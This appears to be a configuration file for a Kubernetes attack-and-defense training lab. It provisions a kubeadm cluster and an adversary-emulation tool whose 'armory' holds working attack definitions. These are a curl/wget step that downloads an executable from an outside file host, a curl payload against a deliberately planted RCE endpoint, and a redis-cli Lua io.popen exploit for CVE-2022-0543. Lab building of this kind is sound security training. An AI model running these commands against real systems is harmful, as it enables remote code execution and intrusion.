kind: playground
name: k8s-adv-emulation-1b038ba5
base: k8s-omni
title: IKT - K8s Attack and Defense
description: A multi-node Kubernetes cluster provisioned with kubeadm, allowing you to choose your preferred container runtime and networking plugin. Perfect for CKA, CKAD, and CKS preparation.
categories:
  - kubernetes
  - security
playground:
  networks:
    - name: local
      subnet: 172.16.0.0/24
  machines:
    - name: dev-machine
      users:
        - name: root
        - name: laborant
          default: true
      drives:
        - source: k8s-omni-dev-machine
          mount: /
          size: 30GiB
      network:
        interfaces:
          - address: 172.16.0.5/24
            network: local
      resources:
        cpuCount: 2
        ramSize: 4G
      startupFiles:
        - path: /home/laborant/armory/drop-ran-ws-bin
          content: |-
            name: Drop Ran-WS Binary
            description: Downloads a binary from the provided source to a system
            tactic: Execution
            techniques: ["User Execution"]
            parameters:
              URL:
                type: string
                default: https://filedn.eu/lInD0fhKjA3uc70xrPjtNUj/ran-ws
                description: the url from where to download the binary
              DST_BIN:
                type: string
                default: /tmp/ran-ws
                description: the destination path of the binary at the remote system
            procedures:
              - key: curl
                command: curl -sS -L ${URL} -o ${DST_BIN} && chmod +x ${DST_BIN} 
              - key: wget
                command: wget ${URL} -O ${DST_BIN} && chmod +x ${DST_BIN} 
            preconditions:
              kind: System
              accessLevel: "user-exec"
            effects: ["sys.has-binary(${DST_BIN})"]
          mode: '644'
          owner: laborant:laborant
        - path: /home/laborant/armory/exploit-oops.yaml
          content: |
            name: Exploit Ooops RCE
            description: Exploit the intentionally introduced RCE vulnerability in the Ooopservability service to execute arbitrary commands on the target system.
            tactic: Lateral Movement
            techniques: ["Exploitation of Remote Services", "T1210"]
            parameters:
              TARGET:
                type: string
                default: ${TARGET.IP}
                description: the DNS name or IP address of the Ooopservability service
              PORT:
                type: int
                default: 8080
                description: the port on which the Ooopservability service is running
              CMD:
                type: string
                default: id
                description: the command to execute on the target system
            procedures:
              - key: curl
                command: |
                  curl -s -X POST http://${TARGET}:${PORT}/api/v1/diagnostics/run 
                    -H 'Content-Type: application/json' 
                    -d '{"command":"${CMD}"}'
            preconditions:
              kind: System
            envelope: 
            effects: ["rce.can-exec(${SRC}, ${TARGET})"]
          mode: '644'
          owner: laborant:laborant
        - path: /home/laborant/armory/exploit-cve-2022-0543.yaml
          content: |-
            name: Exploit Redis CVE-2022-0543
            description: Exploit the CVE-2022-0543 vulnerability in Redis to execute arbitrary commands on the target system.
            tactic: Lateral Movement
            techniques: ["Exploitation of Remote Services", "T1210"]
            status: enabled
            parameters:
              TARGET:
                type: string
                default: ${TARGET.IP}
                description: the DNS name or IP address of the Redis service
              PORT:
                type: int
                default: 6379
                description: the port on which the Redis service is running
              CMD:
                type: string
                default: id
                description: the command to execute on the target system
            procedures:
              - key: exec-cmd
                tool: redis-cli
                command: |
                  redis-cli -h ${TARGET} -p ${PORT} EVAL "local cmd = ARGV[1] .. ' 2>&1'; local f = io.popen(cmd); local d = f:read('*a') f:close(); return d;" 0 "${CMD}"
            preconditions:
              kind: System
              # has-binary: redis-cli
            envelope: 
            effects: ["rce.can-exec(${SRC}, ${TARGET})"]
          mode: '644'
          owner: laborant:laborant
    - name: cplane-01
      users:
        - name: root
        - name: laborant
          default: true
      drives:
        - source: k8s-omni-cplane
          mount: /
          size: 30GiB
      network:
        interfaces:
          - address: 172.16.0.2/24
            network: local
      resources:
        cpuCount: 4
        ramSize: 4G
    - name: node-01
      users:
        - name: root
        - name: laborant
          default: true
      drives:
        - source: k8s-omni-node
          mount: /
          size: 30GiB
      network:
        interfaces:
          - network: local
            address: 172.16.0.3/24
      resources:
        cpuCount: 2
        ramSize: 4G
  startupFiles:
    - path: /home/laborant/manifests/oops.yaml
      mode: '644'
      owner: laborant:laborant
      machines:
        - dev-machine
      source: https://raw.githubusercontent.com/Magier/K8sEnvs/refs/heads/main/Oops/oops.yaml
    - path: /home/laborant/manifests/oops_redis.yaml
      mode: '644'
      owner: laborant:laborant
      machines:
        - dev-machine
      source: https://raw.githubusercontent.com/Magier/K8sEnvs/refs/heads/main/Oops/redis_oops.yaml
  tabs:
    - id: ide-dev-machine
      kind: ide
      name: IDE
      machine: dev-machine
      enabled: true
    - id: kexp-dev-machine
      kind: kexp
      name: Explorer
      machine: dev-machine
      enabled: true
    - id: terminal-dev-machine
      kind: terminal
      name: dev-machine
      machine: dev-machine
      enabled: true
    - id: terminal-cplane-01
      kind: terminal
      name: cplane-01
      machine: cplane-01
      enabled: true
    - id: terminal-node-01
      kind: terminal
      name: node-01
      machine: node-01
      enabled: true
    - id: http-port-08oi77oy93tw
      kind: http-port
      name: RanUI
      machine: dev-machine
      number: 8080
      access: private
      enabled: true
  initTasks:
    init_cplane_00_configure_cni:
      name: init_cplane_00_configure_cni
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      run: |-
        cat > /etc/cni/net.d/99-loopback.conf <<EOF
        {
          "cniVersion": "1.1.0",
          "name": "lo",
          "type": "loopback"
        }
        EOF

        cat > /etc/cni/net.d/10-bridge.conf <<EOF
        {
          "cniVersion": "1.0.0",
          "name": "bridge",
          "type": "bridge",
          "bridge": "cni0",
          "isGateway": true,
          "ipMasq": true,
          "ipam": {
            "type": "host-local",
            "ranges": [
              [{"subnet": "10.244.0.0/24"}]
            ],
            "routes": [{"dst": "0.0.0.0/0"}]
          }
        }
        EOF
      conditions:
        - key: Networking plugin
          value: static
    init_cplane_00_configure_routes:
      name: init_cplane_00_configure_routes
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      run: |-
        ip route add 10.244.1.0/24 via 172.16.0.3  # node-01
        ip route add 10.244.2.0/24 via 172.16.0.4  # node-02
      conditions:
        - key: Networking plugin
          value: static
    init_cplane_10_containerd_install:
      name: init_cplane_10_containerd_install
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_cplane_00_configure_cni
        - init_cplane_00_configure_routes
      run: |-
        mv /opt/iximiuz-labs/containerd/containerd.service /etc/systemd/system/containerd.service

        chmod +x /opt/iximiuz-labs/containerd/bin/*
        mv /opt/iximiuz-labs/containerd/bin/* /usr/local/bin

        mkdir -p /etc/containerd
        cat <<EOF > /etc/containerd/config.toml
        version = 2

        [plugins."io.containerd.grpc.v1.cri"]
          [plugins."io.containerd.grpc.v1.cri".containerd]
            snapshotter = "overlayfs"
            default_runtime_name = "runc"
          [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc]
            runtime_type = "io.containerd.runc.v2"
          [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]
            SystemdCgroup = true
        [plugins."io.containerd.grpc.v1.cri".cni]
          bin_dir = "/opt/cni/bin"
          conf_dir = "/etc/cni/net.d"
        EOF

        systemctl daemon-reload
        systemctl enable --now containerd
      conditions:
        - key: Container runtime
          value: containerd
    init_cplane_10_cri_o_install:
      name: init_cplane_10_cri_o_install
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_cplane_00_configure_cni
        - init_cplane_00_configure_routes
      run: |-
        apt-get update
        cp -r /opt/iximiuz-labs/apt-cache/* /var/cache/apt/archives/
        apt-get install -y cri-o podman

        systemctl daemon-reload
        systemctl enable --now crio
      conditions:
        - key: Container runtime
          value: cri-o
    init_cplane_15_containerd_load_images:
      name: init_cplane_15_containerd_load_images
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_cplane_10_containerd_install
      run: |-
        for i in $(ls /opt/iximiuz-labs/images); do
          ctr -n k8s.io images import "/opt/iximiuz-labs/images/$i"
        done

        rm -rf /opt/iximiuz-labs/images
      conditions:
        - key: Container runtime
          value: containerd
    init_cplane_15_cri_o_load_images:
      name: init_cplane_15_cri_o_load_images
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_cplane_10_cri_o_install
      run: |-
        for i in $(ls /opt/iximiuz-labs/images); do
          podman load -i "/opt/iximiuz-labs/images/$i"
        done

        rm -rf /opt/iximiuz-labs/images
      conditions:
        - key: Container runtime
          value: cri-o
    init_cplane_20_kubeadm_init:
      name: init_cplane_20_kubeadm_init
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_cplane_15_containerd_load_images
        - init_cplane_15_cri_o_load_images
      run: kubeadm init --pod-network-cidr=10.244.0.0/16
    init_cplane_30_place_kubeconfig:
      name: init_cplane_30_place_kubeconfig
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_cplane_20_kubeadm_init
      run: |-
        mkdir /root/.kube
        ln -s /etc/kubernetes/admin.conf /root/.kube/config

        mkdir /home/laborant/.kube
        cp /etc/kubernetes/admin.conf /home/laborant/.kube/config
        chown -R laborant:laborant /home/laborant/.kube
    init_cplane_40_taint:
      name: init_cplane_40_taint
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_cplane_30_place_kubeconfig
      run: kubectl taint node cplane-01 node-role.kubernetes.io/control-plane:NoSchedule-
    init_cplane_50_calico_crds:
      name: init_cplane_50_calico_crds
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_cplane_50_calico_operator
      run: |-
        curl -s https://raw.githubusercontent.com/projectcalico/calico/v3.29.1/manifests/custom-resources.yaml | \
        yq eval 'select(.kind == "Installation") | .spec.calicoNetwork.ipPools[] |= (.cidr = "10.244.0.0/16")' - | \
        kubectl apply -f -

        curl -s https://raw.githubusercontent.com/projectcalico/calico/v3.29.1/manifests/custom-resources.yaml | \
        yq eval 'select(.kind != "Installation")' - | \
        kubectl apply -f -
      conditions:
        - key: Networking plugin
          value: calico
    init_cplane_50_calico_operator:
      name: init_cplane_50_calico_operator
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_cplane_40_taint
      run: 'kubectl create -f https://raw.githubusercontent.com/projectcalico/calico/v3.29.1/manifests/tigera-operator.yaml                '
      conditions:
        - key: Networking plugin
          value: calico
    init_cplane_50_cilium:
      name: init_cplane_50_cilium
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_cplane_40_taint
      run: |-
        CILIUM_CLI_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/cilium-cli/main/stable.txt)
        CLI_ARCH=amd64
        if [ "$(uname -m)" = "aarch64" ]; then CLI_ARCH=arm64; fi

        curl -L --fail --remote-name-all https://github.com/cilium/cilium-cli/releases/download/${CILIUM_CLI_VERSION}/cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
        sha256sum --check cilium-linux-${CLI_ARCH}.tar.gz.sha256sum
        tar xzvfC cilium-linux-${CLI_ARCH}.tar.gz /usr/local/bin
        rm cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}

        cilium install
      conditions:
        - key: Networking plugin
          value: cilium
    init_cplane_50_flannel:
      name: init_cplane_50_flannel
      machine: cplane-01
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_cplane_40_taint
      run: kubectl apply -f https://github.com/flannel-io/flannel/releases/latest/download/kube-flannel.yml
      conditions:
        - key: Networking plugin
          value: flannel
    init_dev_machine_10_place_kubeconfig:
      name: init_dev_machine_10_place_kubeconfig
      machine: dev-machine
      init: true
      user: root
      timeout_seconds: 300
      run: |-
        mkdir -p /root/.kube
        scp -o StrictHostKeyChecking=no cplane-01:/etc/kubernetes/admin.conf /root/.kube/config

        mkdir -p /home/laborant/.kube
        cp /root/.kube/config /home/laborant/.kube/config
        chown -R laborant:laborant /home/laborant/.kube
    init_dev_machine_20_install_cilium:
      name: init_dev_machine_20_install_cilium
      machine: dev-machine
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_dev_machine_10_place_kubeconfig
      run: |-
        CILIUM_CLI_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/cilium-cli/main/stable.txt)
        CLI_ARCH=amd64
        if [ "$(uname -m)" = "aarch64" ]; then CLI_ARCH=arm64; fi

        curl -L --fail --remote-name-all https://github.com/cilium/cilium-cli/releases/download/${CILIUM_CLI_VERSION}/cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
        sha256sum --check cilium-linux-${CLI_ARCH}.tar.gz.sha256sum
        tar xzvfC cilium-linux-${CLI_ARCH}.tar.gz /usr/local/bin
        rm cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
      conditions:
        - key: Networking plugin
          value: cilium
    init_dev_machine_30_apply_manifests:
      name: init_dev_machine_30_apply_manifests
      machine: dev-machine
      init: true
      user: laborant
      timeout_seconds: 300
      needs:
        - init_dev_machine_10_place_kubeconfig
      run: |-
        MANIFEST_DIR=$HOME/manifests

        echo "Waiting for Kubernetes API..."
        until kubectl get nodes >/dev/null 2>&1; do sleep 2; done


        if find "$MANIFEST_DIR" -type f \( -name '*.yaml' -o -name '*.yml' \) | grep -q .; then
          echo "Applying Kubernetes manifests..."
          kubectl apply -f "$MANIFEST_DIR"
        else
          echo "No manifests found in $MANIFEST_DIR — skipping apply"
        fi


        echo "Waiting for Kubernetes API..."
        until kubectl get nodes >/dev/null 2>&1; do sleep 2; done

        echo "Waiting for deployments..."
        kubectl get deployments -A --no-headers \
        | awk '{print $1, $2}' \
        | while read ns name; do
          echo "→ $ns / $name"
          kubectl rollout status deployment "$name" -n "$ns" --timeout=180s
        done

        echo "Waiting for statefulsets..."
        kubectl get statefulsets -A --no-headers \
        | awk '{print $1, $2}' \
        | while read ns name; do
          echo "→ $ns / $name"
          kubectl rollout status statefulset "$name" -n "$ns" --timeout=180s
        done
    init_dev_machine_30_install_argocd:
      name: init_dev_machine_30_install_argocd
      machine: dev-machine
      init: true
      user: root
      timeout_seconds: 300
      run: |
        kubectl create namespace argocd
        kubectl apply -n argocd --server-side --force-conflicts -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml
    init_dev_machine_30_install_ran:
      name: init_dev_machine_30_install_ran
      machine: dev-machine
      init: true
      user: root
      timeout_seconds: 300
      run: |-
        TMP=/tmp/ran.tar.gz
        RAN_DIR=/usr/local/bin
        curl -L https://github.com/magier/ran/releases/latest/download/ran-linux-amd64.tar.gz -o $TMP
        echo "unpacking Ran into $RAN_DIR/ran"
        tar -xzvf "$TMP" -C "$RAN_DIR"
        #rm $TMP
        chmod +x "$RAN_DIR/ran"

        cat <<EOF >/etc/systemd/system/ran-ui.service
        [Unit]
        Description=Ran UI Emulator
        After=network.target

        [Service]
        Type=simple

        User=laborant
        # wait until files and API server are ready
        ExecStartPre=/bin/bash -c 'until test -x "$RAN_DIR/ran"; do sleep 2; done'
        ExecStartPre=/bin/bash -c 'until test -f /home/laborant/.kube/config; do sleep 2; done'
        ExecStartPre=/bin/bash -c 'until kubectl get nodes >/dev/null 2>&1; do sleep 2; done'

        ExecStart=$RAN_DIR/ran emulate --armory /home/laborant/armory
        Restart=on-failure
        RestartSec=5

        [Install]
        WantedBy=multi-user.target
        EOF
    init_dev_machine_50_start_ran:
      name: init_dev_machine_50_start_ran
      machine: dev-machine
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_dev_machine_30_apply_manifests
        - init_dev_machine_30_install_ran
        - init_dev_machine_10_place_kubeconfig
      run: systemctl start ran-ui
    init_dev_machine_60_install_kagent:
      name: init_dev_machine_60_install_kagent
      machine: dev-machine
      init: true
      user: root
      timeout_seconds: 300
      needs:
        - init_dev_machine_30_apply_manifests
      run: |-
        KAGENT_VERSION="${KAGENT_VERSION:-0.10.0-rc6}"
        LOCAL_PATH_VERSION="${LOCAL_PATH_VERSION:-v0.0.37}"

        KAGENT_NAMESPACE="kagent"
        LOCAL_PATH_NAMESPACE="local-path-storage"
        kubectl apply -f "https://raw.githubusercontent.com/rancher/local-path-provisioner/${LOCAL_PATH_VERSION}/deploy/local-path-storage.yaml"
        kubectl rollout status deployment/local-path-provisioner -n "${LOCAL_PATH_NAMESPACE}" --timeout=120s
        kubectl patch storageclass local-path --type=merge -p '{"metadata":{"annotations":{"storageclass.kubernetes.io/is-default-class":"true"}}}'
        curl -fsSL "https://raw.githubusercontent.com/kagent-dev/kagent/refs/heads/main/scripts/get-kagent" | bash
        kagent version || true
        KAGENT_DEFAULT_MODEL_PROVIDER=ollama kagent install --profile minimal --timeout 5m
  initConditions:
    values:
      - key: Networking plugin
        default: cilium
        nullable: true
        options:
          - calico
          - cilium
          - flannel
          - static
      - key: Container runtime
        default: containerd
        options:
          - containerd
          - cri-o
  accessControl:
    canList:
      - anyone
    canRead:
      - anyone
    canStart:
      - anyone
